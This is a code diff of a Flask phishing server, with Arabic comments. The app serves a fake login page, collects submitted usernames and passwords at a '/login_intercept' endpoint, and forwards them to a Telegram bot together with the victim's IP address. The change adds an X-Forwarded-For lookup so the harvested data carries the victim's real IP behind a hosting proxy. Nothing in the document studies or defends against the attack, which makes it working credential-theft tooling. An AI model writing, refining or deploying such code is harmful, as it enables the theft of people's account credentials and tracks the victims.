@@ -1,4 +1,4 @@
-# app.py - الخادم النظيف والجاهز لاستقبال البيانات الحساسة (Login Intercept)
+# app.py - النسخة النهائية المصححة لخطأ IP و الجاهزة لـ Login Intercept
 from flask import Flask, request, jsonify, render_template
 import requests
 import os
@@ -25,14 +25,18 @@ def send_telegram_message(message, parse_mode='Markdown'):
     except requests.exceptions.RequestException:
         pass 
 
-# مسار جديد لاستقبال بيانات تسجيل الدخول (Username/Password)
+# دالة للحصول على IP الحقيقي باستخدام X-Forwarded-For
+def get_real_ip():
+    # Render ترسل IP الحقيقي في هذا الهيدر
+    return request.headers.get('X-Forwarded-For', request.remote_addr)
+
 @app.route('/login_intercept', methods=['POST'])
 def login_intercept():
     try:
-        # البيانات تأتي من نموذج HTML (Form Data)
         username = request.form.get('login_name', 'N/A')
         password = request.form.get('login_pass', 'N/A')
-        ip_address = request.remote_addr
+        # الآن نستخدم الدالة المصححة للحصول على IP الحقيقي
+        ip_address = get_real_ip()
         
         # صياغة رسالة HTML متقنة لإبراز الرمز
         telegram_message = f"""
@@ -56,7 +60,6 @@ def login_intercept():
         send_telegram_message(error_message)
         return jsonify({"status": "internal_error"}), 500
 
-# المسار الرئيسي الذي يعرض صفحة تسجيل الدخول المزيفة
 @app.route('/')
 def home():
     return render_template('login_lure.html')
